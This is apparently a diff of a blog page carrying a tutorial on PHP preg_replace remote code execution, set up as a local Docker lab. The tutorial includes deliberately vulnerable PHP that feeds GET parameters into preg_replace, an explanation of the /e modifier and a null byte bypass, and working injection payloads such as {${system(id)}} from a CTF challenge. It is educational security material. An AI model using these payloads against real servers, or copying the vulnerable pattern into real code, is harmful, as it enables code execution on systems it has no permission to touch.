@@ -1,8 +1,6 @@
-<!DOCTYPE html>
-<html>
-  <head>
+<!DOCTYPE html><html><head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="viewport"content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
   
   
   <title>  PHP::Preg_replace() RCE |   Ikonw </title>
@@ -24,7 +22,7 @@
   <nav class="inner">
     <div class="title">
       <a href="/">
-        <img class="logo" src="/images/logo.png" />
+        <img class="logo" src="/images/logo.png">
       </a>
     </div>
 
@@ -121,20 +119,20 @@
 <span id="more"></span>
 <h1 id="Preg-replace"><a href="#Preg-replace" class="headerlink" title="Preg_replace"></a>Preg_replace</h1><p>preg_replace — Perform a regular expression search and replace</p>
 <h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
-<p>preg_replace ( <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$pattern</code> , <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$replacement</code> , <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$subject</code> [, int <code>$limit</code> &#x3D; -1 [, int <code>&amp;$count</code> ]] ) : <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a></p>
+<p>preg_replace ( <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$pattern</code> , <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$replacement</code> , <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$subject</code> [, int <code>$limit</code> = -1 [, int <code>&amp;$count</code> ]] ) : <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a></p>
 </blockquote>
 <h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>All the testing will be test under docker environment with php version 5.3</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name app -d -p 8080:80 -v $(<span class="built_in">pwd</span>):/var/www/app romeoz/docker-apache-php:5.3</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker run --name app -d -p 8080:80 -v $(<span class="built_in">pwd</span>):/var/www/app romeoz/docker-apache-php:5.3</span><br></pre></td></tr></tbody></table></figure>
 
 <p>put all your php files under the same directory with the docker file.</p>
 <p>Access the page in localhost port 8080</p>
-<h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(patterns, replacements, input, limit, count)</span><br></pre></td></tr></table></figure>
+<h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(patterns, replacements, input, limit, count)</span><br></pre></td></tr></tbody></table></figure>
 
 <p>Searches <code>subject</code> for matches to <code>pattern</code> and replaces them with <code>replacement</code>.</p>
 <p>The normal use of <code>Preg_replace()</code> is safe enough for replacing pattern using regex </p>
 <p>Let see a example:</p>
 <p>When we want to filter unwanted words from user input and replace it with proper words</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$input</span> = <span class="string">&quot;eat my shit please&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pattern&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;replacement&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pattern&#x27;</span>];</span><br><span class="line">                <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;replacement&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>,<span class="variable">$replacement</span>,<span class="variable">$input</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$input</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$input</span> = <span class="string">"eat my shit please"</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'pattern'</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'replacement'</span>])){</span><br><span class="line">                <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[<span class="string">'pattern'</span>];</span><br><span class="line">                <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[<span class="string">'replacement'</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>,<span class="variable">$replacement</span>,<span class="variable">$input</span>);</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$input</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
 
 <p>The <code>/i</code> modifier will match both upper and lower case letters.</p>
 <p>we expect the output to be <code>eat my shit please</code> without any parameter</p>
@@ -143,10 +141,10 @@
 <p>And we filter off bad words. Everything seems fine with this function</p>
 <p>The danger comes in when the modifier set to <code>/e</code> instead of <code>/i</code>, it will cause PHP to execute the replacement value as code.</p>
 <p><img src="/images/PHP-preg_replace()/image-20200923175756261.png" alt="image-20200923175756261"></p>
-<p>the <code>preg_replace()</code> has come <code>preg_replace(&#39;/shit/e&#39;,&#39;system(&#39;whoami&#39;),&quot;eat my shit please&quot;)</code></p>
-<p>The string <code>shit</code> trigger the replace function to execute a <code>system(&#39;whoami&#39;)</code></p>
+<p>the <code>preg_replace()</code> has come <code>preg_replace('/shit/e','system('whoami'),"eat my shit please")</code></p>
+<p>The string <code>shit</code> trigger the replace function to execute a <code>system('whoami')</code></p>
 <h2 id="Null-byte-bypass"><a href="#Null-byte-bypass" class="headerlink" title="Null byte  bypass"></a>Null byte  bypass</h2><p>Let’s look at the another example if we are not able to control the delimiter </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$input</span> = <span class="string">&quot;eat my shit please&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pattern&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;replacement&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pattern&#x27;</span>];</span><br><span class="line">                <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;replacement&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>,<span class="variable">$replacement</span>,<span class="variable">$input</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$input</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$input</span> = <span class="string">"eat my shit please"</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'pattern'</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'replacement'</span>])){</span><br><span class="line">                <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[<span class="string">'pattern'</span>];</span><br><span class="line">                <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[<span class="string">'replacement'</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>,<span class="variable">$replacement</span>,<span class="variable">$input</span>);</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$input</span>;</span><br><span class="line">        }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
 
 <p><code>pattern</code> parameter no longer require the <code>/</code> and delimiter</p>
 <p><img src="/images/PHP-preg_replace()/image-20200923180446620.png" alt="image-20200923180446620"></p>
@@ -154,30 +152,30 @@
 <p>This code seems safe, attacker can no longer end the regular expression with their own modifier.</p>
 <p>Do take note <code>PHP</code> take some of the syntax from <code>C</code> . In C, it handles strings as a character array, it needs a way to define the last character of the string. This is done using a null byte. A null byte is denoted by <code>\0</code> in C. <code>preg_replace</code> function handle an input string as they handled by C.</p>
 <p>Therefore, we can input a <code>\0</code> which is <code>%00</code> in URL to control the last character of the string.</p>
-<p><img src="/images/PHP-preg_replace()/image-20200923181534025.png" alt="image-20200923181534025"></p>
+<p><img src="/images/placeholder.png" alt="image-20200923181534025" data-src="/images/PHP-preg_replace()/image-20200923181534025.png" class="lazyload"></p>
 <h2 id="CTF-challenge"><a href="#CTF-challenge" class="headerlink" title="CTF challenge"></a>CTF challenge</h2><p>CTF challenge from <a target="_blank" rel="noopener" href="https://www.ripstech.com/php-security-calendar-2017/">PHP SECURITY CALENDAR</a></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Type: text/plain&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> complexStrtolower(<span class="variable">$regex</span>, <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="built_in">return</span> preg_replace(</span><br><span class="line">    <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$regex</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">    <span class="variable">$value</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach (<span class="variable">$_GET</span> as <span class="variable">$regex</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="built_in">echo</span> complexStrtolower(<span class="variable">$regex</span>, <span class="variable">$value</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> complexStrtolower(<span class="variable">$regex</span>, <span class="variable">$value</span>) {</span><br><span class="line">  <span class="built_in">return</span> preg_replace(</span><br><span class="line">    <span class="string">'/('</span> . <span class="variable">$regex</span> . <span class="string">')/ei'</span>,</span><br><span class="line">    <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">    <span class="variable">$value</span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">foreach (<span class="variable">$_GET</span> as <span class="variable">$regex</span> =&gt; <span class="variable">$value</span>) {</span><br><span class="line">  <span class="built_in">echo</span> complexStrtolower(<span class="variable">$regex</span>, <span class="variable">$value</span>) . <span class="string">"\n"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
 <p>We can use PHP’s curly syntax to inject the function call</p>
 <p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex">Complex (curly) syntax</a></p>
-<p><code>http://localhost:8080/challenges.php/?\S*=&#123;$&#123;system(id)&#125;&#125;</code></p>
-<p>The reason why we are using curly syntax is because after the function <code>complexStrtolower</code> we are storing our result into <code>&quot;&lt;result&gt;&quot;</code> in double quotes</p>
+<p><code>http://localhost:8080/challenges.php/?\S*={${system(id)}}</code></p>
+<p>The reason why we are using curly syntax is because after the function <code>complexStrtolower</code> we are storing our result into <code>"&lt;result&gt;"</code> in double quotes</p>
 <p>In PHP, the variable in double quotes are allow to parse as variable.</p>
 <p>In curly syntax, single curly braces is for parsing variable.</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Works, outputs: This is fantastic</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is <span class="subst">&#123;$great&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Works, outputs: This is fantastic</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is <span class="subst">{$great}</span>"</span>;</span><br></pre></td></tr></tbody></table></figure>
 
 <blockquote>
 <p><strong>Note</strong>:</p>
-<p>Functions, method calls, static class variables, and class constants inside <code>&#123;$&#125;</code> work since PHP 5. However, the value accessed will be interpreted as the name of a variable in the scope in which the string is defined. Using single curly braces (<code>&#123;&#125;</code>) will not work for accessing the return values of functions or methods or the values of class constants or static class variables.</p>
+<p>Functions, method calls, static class variables, and class constants inside <code>{$}</code> work since PHP 5. However, the value accessed will be interpreted as the name of a variable in the scope in which the string is defined. Using single curly braces (<code>{}</code>) will not work for accessing the return values of functions or methods or the values of class constants or static class variables.</p>
 </blockquote>
-<p>For functions we have to use double curly braces. E.g. <code>&#123;$&#123;phpinfo()&#125;&#125;</code></p>
-<h2 id="Another-question"><a href="#Another-question" class="headerlink" title="Another question"></a>Another question</h2><p>why we are able to execute <code>system(id)</code> without quote the <code>&#39;id&#39;</code></p>
-<p><img src="/images/PHP-preg_replace()/image-20200923195620695.png" alt="image-20200923195620695"></p>
+<p>For functions we have to use double curly braces. E.g. <code>{${phpinfo()}}</code></p>
+<h2 id="Another-question"><a href="#Another-question" class="headerlink" title="Another question"></a>Another question</h2><p>why we are able to execute <code>system(id)</code> without quote the <code>'id'</code></p>
+<p><img src="/images/placeholder.png" alt="image-20200923195620695" data-src="/images/PHP-preg_replace()/image-20200923195620695.png" class="lazyload"></p>
 <p>if we add <code>id</code> in single quotes, it will auto add a slash to escape the single quotes (Which I have no idea ??? Comment if you know the reason)</p>
 <p>however, in PHP. Constants without quote will assume as string beacuse of the PHP ‘loosely typed’ characterstic (Will be discover more on later post <code>PHP type juggling</code>)</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(whoami);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(whoami);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/PHP-preg_replace()/image-20200923200156085.png" alt="image-20200923200156085"></p>
+<p><img src="/images/placeholder.png" alt="image-20200923200156085" data-src="/images/PHP-preg_replace()/image-20200923200156085.png" class="lazyload"></p>
 <h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul>
 <li><a target="_blank" rel="noopener" href="https://infosecabsurdity.wordpress.com/2012/12/17/phpwcms-remote-code-execution-and-php-pcre-filter-evasion-bypasses-zeroday/">https://infosecabsurdity.wordpress.com/2012/12/17/phpwcms-remote-code-execution-and-php-pcre-filter-evasion-bypasses-zeroday/</a></li>
 <li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></li>
@@ -211,25 +209,31 @@
         <li class="iconfont 
 		icon-share-weixin 
 		-mob-share-weixin 
-		item"
-		></li>		
+		item"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-weibo 
+		-mob-share-weibo 
+		item"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-facebook 
+		-mob-share-facebook 
+		item"></li>		
    	   			             
         <li class="iconfont 
 		icon-share-twitter 
 		-mob-share-twitter 
-		item"
-		></li>		
+		item"></li>		
    	   			             
         <li class="iconfont 
 		icon-share-google 
 		-mob-share-google 
-		item"
-		></li>		
+		item"></li>		
    	   
 </ul>	
 
-<script id="-mob-share" 
-src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
       
     </div>
   </div>
@@ -272,7 +276,7 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
 
     <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
 
-    <script src='//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js'></script>
+    <script src="//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js"></script>
 
     <script>
         new Valine({
@@ -298,10 +302,7 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
   
     <div class="none" id="search">
     <div class="header">
-        <input type="text" 
-        placeholder="Typing Something here." 
-        id="search-input" 
-        class="input" />
+        <input type="text" placeholder="Typing Something here." id="search-input" class="input">
         
         <i id="search-cancel" class="iconfont icon-cancel"></i>
     </div>
@@ -311,7 +312,7 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
      <div class="mobile-menu">      
 
       
-      <img class="mobile-menu-icon" src= "/images/favicon.png" >  
+      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/favicon.png">  
       
 
          
@@ -358,14 +359,14 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
 <footer class="footer">
 	<div class="inner">
 		<div class="copyright">
-			&copy;
+			©
 			
-			2019 -
+			2020 -
 			
 			2023
 			Ikonw
 
-			<br/>
+			<br>
 			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
 		</div>
 	</div>
@@ -374,5 +375,5 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
     
 <script src="/nayo.bundle.js"></script>
            
-  </body>        
-</html>
+          
+</body></html>
